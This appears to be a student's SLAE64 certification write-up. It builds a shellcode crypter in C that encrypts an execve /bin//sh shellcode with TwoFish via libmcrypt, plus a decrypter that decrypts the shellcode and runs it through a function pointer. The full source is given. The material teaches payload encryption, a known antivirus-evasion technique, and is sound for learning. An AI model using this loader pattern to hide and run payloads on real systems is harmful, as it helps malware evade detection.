## Assignment #4: Custom Crypter
---
---
### Introduction
---
This assignment requires to create a crypter using any existing encryption schema. It can be done in the progrmaming language desireed.

The cypher that's going to be implemented is the [TwoFish Cypher](https://en.wikipedia.org/wiki/Twofish). More information on the algorythm for TwoFish can be found at [Bruce Schneier blog](https://www.schneier.com/academic/twofish/).

The original shellcode to crypt is the generated from [Execve-Stack.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment7/Execve-Stack.nasm). This shellcode will be crypted using the code in the [TwoFish_Crypter.c](https://github.com/galminyana/SLAE64/blob/main/Assignment07/TwoFish_Crypter.c) file, and the crypted code, will be decrypted and then executed in the [TwoFish_Decrypter.c](https://github.com/galminyana/SLAE64/blob/main/Assignment07/TwoFish_Decrypter.c) file.

To implement the TwoFish, the `libmcrypt` library is used. Documentation and examples on how to use `libmcrypt` can be found [here](https://fossies.org/dox/libmcrypt-2.5.8/index.html). In Debian Buster GNU/Linux, is required to install the develop libraries for `mcrypt` to use them.

### Implementation Using `libmcrypt`
---
To work with TwoFish, `mcrypt` requires the following inputs:

- A password that will be used to crypt and decrypt. Password needs to be between 1 and 32 bytes length 
- A Initialization Vector (IV). The size of this IV will be 16 bytes 
- The shellcode (a string) to crypt 

The password and IV that's used to encrypt, needs to be the same ones for the decrypt process And the shellcode string will be in hex format.

Steps to follow for using `libmcrypt` in a C Programm are:

1. Initialize `libmcrypt` to work with TwoFish in CFB mode. This is done with the `mcrypt_module_open` function, that returns a `MCRYPT` object that is saved as id_crypt 
```c
MCRYPT id_crypt;
id_crypt = mcrypt_module_open("twofish", NULL, "cfb", NULL); 
```
2. Generate a random IV of 16 bytes long 
```c
int iv_size = mcrypt_enc_get_iv_size(id_crypt);   // Will return 16 bytes

for (int i = 0; i < iv_size; i++) {               // For each byte of the IV
    IV[i] = (unsigned char)rand();                // It is ramdomly generated
} 
```
3. Initialize the crypt (or decrypt) process for `mcrypt` for the id_crypt with the right password and generated IV 
```c
mcrypt_generic_init(id_crypt, password, iv_size, IV); 
```
4. Encrypt or decrypt a string (shellcode) 
```c
// Crypt
mcrypt_generic(id_crypt, code, code_length); 
// DeCrypt
mdecrypt_generic(id_crypt, code, code_length); 
```
5. Close mcrypt id before exiting the programm 
```c
mcrypt_generic_end(id_crypt); 
```
For the assignment, two files are created:

- [TwoFish_Crypter.c](https://github.com/galminyana/SLAE64/blob/main/Assignment07/TwoFish_Crypter.c) : This code crypts the shellcode. The shellcode is placed into a string in hex format. 
- [TwoFish_Decrypter.c](https://github.com/galminyana/SLAE64/blob/main/Assignment07/TwoFish_Decrypter.c) : Decrypts a TwoFish crypted shellcode. Needs the same password and IV used in the crypt process. Once the shellcode is decrypted, program passes execution to it.

### Crypt: Twofish_Crypter.c
---
The code implements explained before to use `libmcrypt` to crypt the shellcode. During the process, the following information is printed on screen (as it will be required in next steps): 
- Size in bytes for the original shellcode
- Original shellcode in hex format 
- The IV generated and used to crypt in hex format.  
- The password used to crypt, that has to match the decryption 
- The crypted shellcode in format to use in ASM code, and another to use in C programs 

The code initializes the `libmcrypt`library to be used with TwoFish. Then generates the IV randomly using the `rand()` function after initializing the seed with `srand()` and `time()` functions and prints them along with the password in the screen. Then the shellcode is crypted and printed in C and ASM formats.

The full code can be found in the [TwoFish_Crypter.c](https://github.com/galminyana/SLAE64/blob/main/Assignment07/TwoFish_Crypter.c) file on the [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment07) for this assignment:
```c 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include <mcrypt.h>

// TwoFish needed setups

#define IV_SIZE 16
unsigned char password[] = "12345678";
unsigned char IV[IV_SIZE];

//  ShellCode to Cypher: Execve-Shell-Stack.nasm
unsigned char code[]= \
"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";

int main (void)
{

	MCRYPT id_crypt;
	int code_length = strlen(code);

	/* Initialize the seed for the rand() function to generate IV */
	srand(time(0));

    /* Print the original shellcode and it's size */
	printf("\nOriginal Shellcode to Cypher (%d bytes):\n", code_length);
	for (int i = 0; i < code_length; i++) {
		printf("0x%02x,", code[i]);
	}

	/* MCrypt TwoFish Initialization */
	id_crypt = mcrypt_module_open("twofish", NULL, "cfb", NULL);

	/* IV initialization */
	printf("\n\nTwoFish IV value (C format): ");
	int iv_size = mcrypt_enc_get_iv_size(id_crypt);                  // Will return 16 bytes
	for (int i = 0; i < iv_size; i++) {
		IV[i] = (unsigned char)rand();
		printf("\\x%02x", IV[i]);
	}

	/* Print Password used for crypting */
	printf("\nTwoFish Password Used: %s", password);

	/* Initialize the encryption process with the pass and IV */
	int x = mcrypt_generic_init(id_crypt, password, 16, IV);
	if (x < 0) {		                                             // Error Handling
		mcrypt_perror(x);
		printf("\n!! ERROR: %d !!", x);
		return MCRYPT_FAILED;
	}

	/* Encryption of the code[] string */
	x = mcrypt_generic(id_crypt, code, code_length);
	if ( x < 0) {		                                             // Error Handling
		mcrypt_perror(x);
		printf("\n!! ERROR: %d !!", x);
		return MCRYPT_FAILED;
	}

	/* Print the crypted shellcode */
	printf("\n\nCrypted Shellcode:\n\n  ASM Format: \n");

		/* First printed in ASM format */
	for (int i = 0; i < code_length-1; i++) {
		printf("0x%02x,", code[i]);
	}

		/* Now printed in C format */
	printf("\n\n  C Format: \n");
	for (int i = 0; i < code_length; i++) {
		printf("\\x%02x", code[i]);
	}

	/* End the mcrypt */
	mcrypt_generic_end(id_crypt);

	printf("\n\n");
	return(0);
}
```
### DeCrypt: Twofish_Decrypter.c
---
This code does exactly the same as before. Just that this time it decrypts the shellcode given. 
> Decrypt needs the same password and IV used to crypt 
The code, once the shellcode has been decrypted, executes it.

The steps are the same as before. The program has the string containing the crypted shellcode in hex format, decrypts with the same password and IV used to crypt, and once this done runs the decrypted shellcode using the following code snippet:
```c
	int (*ret)() = (int(*)())code;
	ret();
```
The full code can be found in the [TwoFish_Decrypter.c](https://github.com/galminyana/SLAE64/blob/main/Assignment07/TwoFish_Decrypter.c) file on the [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment07) for this assignment:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mcrypt.h>

// TwoFish needed setups

#define IV_SIZE 16
unsigned char password[] = "12345678";
// Same IV as crypt
unsigned char IV[IV_SIZE] = \
"\x4b\x43\x90\xbe\x44\x14\x30\x8a\x31\x3d\xed\xba\xfd\x1f\x35\x5e";


/*
  ShellCode to decrypt
*/
unsigned char code[]= \
"\xac\x8a\x9f\x32\x01\xa0\x32\xf2\x2d\xdc\xa6\xd9\xbe\xe7\x54\xe4\xa2\xbc\x05\x54\x10\x75\x13\xad\xf5\xb2\xa6\xc8\x09\xcc\xc8\x0d";

int main (void)
{

	MCRYPT id_crypt;
	int code_length = strlen(code);

	printf("\nCrypted Shellcode (%d bytes):\n", code_length);
	for (int i = 0; i < code_length-1; i++)
	{
		printf("0x%02x,", code[i]);
	}
	printf("0x%02x", code[code_length-1]);	                    // Remove last ","

	/* MCrypt TwoFish Initialization */
	id_crypt = mcrypt_module_open("twofish", NULL, "cfb", NULL);

	/* IV initialization */
	printf("\n\nTwoFish IV value: ");
	int iv_size = mcrypt_enc_get_iv_size(id_crypt);
	for (int i = 0; i < iv_size-1; i++)
	{
		printf("0x%02x,", IV[i]);
	}
	printf("0x%02x", IV[iv_size-1]);	                        // Remove ","

	/* Print Password used for crypting */
	printf("\nTwoFish Password Used: %s", password);

	/* Initialize the encryption process with the pass and IV */
	int x = mcrypt_generic_init(id_crypt, password, 16, IV);
	if (x < 0)		                                            // Error Handling
	{
		mcrypt_perror(x);
		printf("\n!! ERROR: %d !!", x);
		return MCRYPT_FAILED;
	}

	/* Encryption of the code[] string */
	x = mdecrypt_generic(id_crypt, code, code_length);
	if ( x < 0)		                                            // Error Handling
	{
		mcrypt_perror(x);
		printf("\n!! ERROR: %d !!", x);
		return MCRYPT_FAILED;
	}

	/* Print the decrypted shellcode */
	printf("\n\nDeCrypted Shellcode:\n\n  ASM Format: \n");

		/* First printed in ASM format */
	for (int i = 0; i < code_length-1; i++)
	{
		printf("0x%02x,", code[i]);
	}
	printf("0x%02x", code[code_length-1]);	                    // Remove ","

		/* Now printed in C format */
	printf("\n\n  C Format: \n");
	for (int i = 0; i < code_length-1; i++)
	{
		printf("\\x%02x,", code[i]);
	}
	printf("\\x%02x", code[code_length-1]);                     // Remove last ","

	/* End the mcrypt */
	mcrypt_generic_end(id_crypt);

	printf("\n\n");

	/* Lets run the shellcode */
	int (*ret)() = (int(*)())code;
	ret();
}
```
### Run Everything
---




### GitHub Repo Files
---
The [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment07) for this assignment contains the following files:

- [TwoFish_Crypter.c](https://github.com/galminyana/SLAE64/blob/main/Assignment07/TwoFish_Crypter.c) : Implements the Crypt to the Shellcode
- [TwoFish_Decrypter.c](https://github.com/galminyana/SLAE64/blob/main/Assignment07/TwoFish_Decrypter.c) : Decrypts the Shellcode and Runs it
- [Execve-Stack.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment7/Execve-Stack.nasm) : This is the code for the shellcode to use in the PoC.

### The End
---
This pages have been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html).

Student ID: PA-14628
 
